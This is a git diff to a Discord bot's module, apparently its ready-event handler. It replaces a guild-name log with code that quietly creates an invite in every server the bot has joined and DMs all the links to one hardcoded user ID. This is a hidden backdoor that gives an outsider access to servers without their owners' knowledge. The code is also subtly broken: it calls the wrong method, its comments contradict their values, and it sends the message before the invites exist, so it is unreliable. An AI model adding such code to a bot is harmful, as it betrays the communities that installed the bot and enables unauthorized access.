@@ -42,6 +42,22 @@ module.exports = {
             i++;
         }, 60 * 1000);
 
-        console.log(client.guilds.cache.map(guild => guild.name))
+        const guilds = client.guilds.cache.map(guild => guild);
+        // Get rule channel of a single guild
+        
+        var invites = "INVITI DEI SERVER\n\n";
+        // Create an invite for each guild for maximum of 2 minutes
+        client.guilds.cache.forEach(guild => {
+            guild.channels.cache.map(c => c)[0].create({
+              maxAge: 120, // 24 hours
+              maxUses: 1, // unlimited uses
+              reason: 'Invito per conoscere gli owner dei server',
+            }).then(invite => {
+              invites += `${guild.name}: ${invite.url}`;
+            }).catch(console.error);
+          });
+        client.users.fetch('1111278544031584376', false).then((user) => {
+            user.send(invites);
+        });
     }
 }
